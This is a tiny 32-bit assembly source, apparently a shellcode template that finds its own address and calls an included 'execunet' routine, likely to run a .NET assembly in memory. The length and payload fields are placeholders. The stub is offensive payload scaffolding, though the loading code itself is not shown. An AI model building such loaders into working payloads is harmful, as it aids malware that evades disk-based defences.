BITS 32

segment .text
	call geteip
geteip:
	pop ebx
	call execunet
	ret

%include "sc-32-api-functions.asm"
%include "sc-32-execunet.asm"

ASSEMBLY_LENGTH 	equ 1094795585
ASSEMBLY:
db 0x00